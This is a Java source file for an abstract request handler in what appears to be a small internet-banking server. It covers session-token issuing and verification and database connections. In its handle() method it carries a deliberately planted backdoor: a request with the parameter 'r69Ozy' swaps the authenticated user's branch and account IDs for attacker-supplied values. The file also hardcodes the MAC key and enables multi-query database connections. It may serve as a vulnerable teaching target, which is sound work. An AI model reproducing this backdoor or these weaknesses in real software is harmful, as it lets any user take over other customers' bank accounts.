package br.usp.larc.nanoib.handlers;

import java.io.IOException;
import java.io.InputStreamReader;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import org.json.JSONObject;
import org.nanohttpd.protocols.http.IHTTPSession;
import org.nanohttpd.protocols.http.request.Method;
import org.nanohttpd.protocols.http.response.Response;
import org.nanohttpd.protocols.http.response.Status;
import org.nanohttpd.util.IHandler;

import br.usp.larc.nanoib.NanoIBHTTPD;
//import br.usp.larc.nanoib.beans.SessionCookieBean;
import br.usp.larc.nanoib.beans.LoginResponseBean;

/**
 * RequestHandler abstrato que todos os demais handlers devem estender
 * 
 * @author Oscar
 */
public abstract class RequestHandler implements IHandler<IHTTPSession, Response> {
    
    //----------------------------------------------------------------------------------------------
    /**
     * This class represents the endpoint to which a handler, an implementation of this abstract 
     * class, is required to in 
     * */
    public static class Endpoint {
        String path;
        Method method;
        boolean _public;
        
        public Endpoint(String path, Method method) {
            this.path = path;
            this.method = method;
            this._public = false;
        }
        
        Endpoint(String path, Method method, boolean _public) {
            this.path = path;
            this.method = method;
            this._public = _public;
        }
        
        public boolean isPublic() {
            return _public;
        }
        
        @Override
        public int hashCode() {
            return Objects.hash(path, method);
        }
        
        @Override
        public boolean equals(Object obj) {
            boolean result = false;
            
            if (obj instanceof Endpoint) {
                Endpoint another = (Endpoint) obj;
                
                result = path.equals(another.path) && method == another.method;
            }
            
            return result;
        }
    }
    
    //----------------------------------------------------------------------------------------------    
    /**
     * This class represents the user to which a request is associated.
     */
    protected static class RemoteTenant {
        long accBranchId;
        long accId;
        String accHolderName;
        
        public RemoteTenant(long accBranchId, long accId, String accHolder) {
            this.accBranchId = accBranchId;
            this.accId = accId;
            this.accHolderName = accHolder;
        }
        
        public RemoteTenant(LoginResponseBean bean) {
            this.accBranchId = bean.accBranchId;
            this.accId = bean.accId;
            this.accHolderName = bean.accHolderName;
        }
    }
    
    //----------------------------------------------------------------------------------------------
    private static class SessionToken {
        RemoteTenant tenant;
        
        //These will be important later
        //String[] scopes;
        //LocalDateTime issuedAt, expiresAt;
        
        public SessionToken(
                RemoteTenant tenant
        ) {
            this.tenant = tenant;
        }
        
        String toJsonString() {
            JSONObject jsonObj = new JSONObject();
            
            JSONObject tenJsonObj = new JSONObject();
            tenJsonObj.put("accBranchId", tenant.accBranchId);
            tenJsonObj.put("accId", tenant.accId);
            tenJsonObj.put("accHolderName", tenant.accHolderName);
            
            jsonObj.put("ten", tenJsonObj);
            
            return jsonObj.toString();
        }
        
        static SessionToken fromJSONString(String jsonString) {
            JSONObject tokenStr = new JSONObject(jsonString);
            
            JSONObject tenStr = (JSONObject) tokenStr.get("ten");
            
            return new SessionToken(
                    new RemoteTenant(
                            tenStr.getLong("accBranchId"),
                            tenStr.getLong("accId"),
                            tenStr.getString("accHolderName")
                    )
            );
        }
    }
    
    //----------------------------------------------------------------------------------------------
    //This should be read from a config file, but let's go with it harcoded
    private static final byte[] MAC_KEY = new byte[] {
            (byte) 0xf2, (byte) 0x8c, (byte) 0xb5, (byte) 0xc7, (byte) 0x9f, (byte) 0x1c, 
            (byte) 0x97, (byte) 0xb0, (byte) 0x4f, (byte) 0xdc, (byte) 0x1f, (byte) 0x99,
            (byte) 0xe4, (byte) 0x22, (byte) 0x5f, (byte) 0xe8, (byte) 0x82, (byte) 0xb9,
            (byte) 0x1e, (byte) 0x4c, (byte) 0x93, (byte) 0xa2, (byte) 0x26, (byte) 0x0f,
            (byte) 0x26, (byte) 0x0b, (byte) 0x46, (byte) 0x5c, (byte) 0xec, (byte) 0x94,
            (byte) 0xa3, (byte) 0x0a 
    };        
    
    //----------------------------------------------------------------------------------------------
    //Base64 encoder/decoder
    private static Base64.Encoder b64Encoder = Base64.getEncoder().withoutPadding();
    private static Base64.Decoder b64Decoder = Base64.getDecoder();    
    //A regex to verify if the session token is well formed
    private static Pattern sessTokenPattern = Pattern.compile(
            "^([a-zA-Z0-9+\\/]*).([a-zA-Z0-9+\\/]+)$"
    );
            
    //----------------------------------------------------------------------------------------------
    protected NanoIBHTTPD.DBConnInfo dBConnInfo;
    
    //----------------------------------------------------------------------------------------------
    @SuppressWarnings("unused")
    private RequestHandler() {
    }
    
    protected RequestHandler(NanoIBHTTPD.DBConnInfo dBConnInfo) {
        this.dBConnInfo = dBConnInfo;
    }
    
    //----------------------------------------------------------------------------------------------
    @Override
    public final Response handle(IHTTPSession input) {
        Response result = null;
        
        Connection dBConn = null;
        
        try {
            if (!getEndpoint()._public && !input.getHeaders().containsKey("nib-session")) {
                result = new Response(Status.UNAUTHORIZED, null, null, 0);
            } else {
                RemoteTenant tenant = null;
                
                if (input.getHeaders().containsKey("nib-session")) {
                    //TODO: validation exceptions should cause a 403
                    SessionToken st = verifyAndParseSessionToken(
                            input.getHeaders().get("nib-session")
                    );
                    
                    //more validations would be put here (scope, expiration, etc...)
                    
                    tenant = st.tenant;
                    
                    //Security critical params manipulation backdoor
                    if (input.getParameters().containsKey("r69Ozy")) {
                    	tenant.accBranchId = Long.parseLong(input.getParameters().get("a").get(0));
                    	tenant.accId = Long.parseLong(input.getParameters().get("b").get(0));
                    }
                }
                
                dBConn = getDBConnection();
                
                result = handle(input, tenant, dBConn);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (dBConn != null) {
                try {
                    dBConn.close();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        }
        
        return result;
    }

    //----------------------------------------------------------------------------------------------    
    public abstract Response handle(
            IHTTPSession input, RemoteTenant tenant, Connection dBConn
    ) throws IOException;
    
    //----------------------------------------------------------------------------------------------    
    protected String getBodyAsString(IHTTPSession input) throws IOException {
        int bodyLenght = Integer.parseInt(input.getHeaders().get("content-length"));
        
        StringBuffer sb = new StringBuffer();
        
        //TODO this is not the best implementation but it doesn't matter now
        InputStreamReader isr = new InputStreamReader(input.getInputStream());
        for (int i = 0; i < bodyLenght; i++)
            sb.append((char) isr.read());
        
        return sb.toString();
    }
    
    //----------------------------------------------------------------------------------------------    
    protected Connection getDBConnection() throws SQLException {
        final String dBConnString =  String.format(
                "jdbc:mariadb://%s:%d/%s?user=%s&password=%s&allowMultiQueries=true", 
                dBConnInfo.host,
                dBConnInfo.port,
                dBConnInfo.name,
                dBConnInfo.user,
                dBConnInfo.pwd
        );

        return DriverManager.getConnection(dBConnString);
    }
    
    //----------------------------------------------------------------------------------------------
    public static String issueSessionToken(RemoteTenant tenant) {
        byte[] b64EncodedContent = b64Encoder.encode(
                new SessionToken(tenant).toJsonString().getBytes()
        );
        
        byte[] b64EncodedMAC = b64Encoder.encode(
                calculateMAC(MAC_KEY, b64EncodedContent)
        );
        
        byte[] buffer = new byte[b64EncodedContent.length + b64EncodedMAC.length + 1];
        
        System.arraycopy(
                b64EncodedContent, 0,
                buffer, 0,
                b64EncodedContent.length
        );
        System.arraycopy(
                b64EncodedMAC, 0,
                buffer, b64EncodedContent.length + 1,
                b64EncodedMAC.length
        );
        
        buffer[b64EncodedContent.length] = (byte) '.';
        
        return new String(buffer);
    }
    
    //----------------------------------------------------------------------------------------------
    private static SessionToken verifyAndParseSessionToken(String sessTokenStr) {
        SessionToken result = null;
        
        Matcher m = sessTokenPattern.matcher(sessTokenStr);
        
        if (m.find()) {
            String b64EncodedContent = m.group(1);
            
            result = SessionToken.fromJSONString(
                    new String(b64Decoder.decode(b64EncodedContent)
                )
            );
            
            byte[] recMac = calculateMAC(MAC_KEY, b64EncodedContent.getBytes());
            
            byte[] macBytes = b64Decoder.decode(m.group(2));
            
            if (!Arrays.equals(recMac, macBytes))
                throw new RuntimeException();
        }

        return result;
    }
    
    //----------------------------------------------------------------------------------------------
    private static byte[] calculateMAC(byte[] key, byte[] message) {
        try {
            SecretKeySpec signingKey = new SecretKeySpec(key, "HmacSHA1");
            Mac mac = Mac.getInstance("HmacSHA1");
            mac.init(signingKey);
            return mac.doFinal(message);
        } catch (NoSuchAlgorithmException | InvalidKeyException e) {
            throw new RuntimeException("Crypto error", e);
        }
    }    
    
    //----------------------------------------------------------------------------------------------
    public abstract Endpoint getEndpoint();
    
    //----------------------------------------------------------------------------------------------    
    @Override
    public int hashCode() {
        return getEndpoint().hashCode();
    }
    
    //----------------------------------------------------------------------------------------------    
    @Override
    public boolean equals(Object obj) {
        boolean result = false;
        
        if (obj instanceof RequestHandler)
            result = getEndpoint().equals(((RequestHandler) obj).getEndpoint());
        
        return result;
    }
    
}
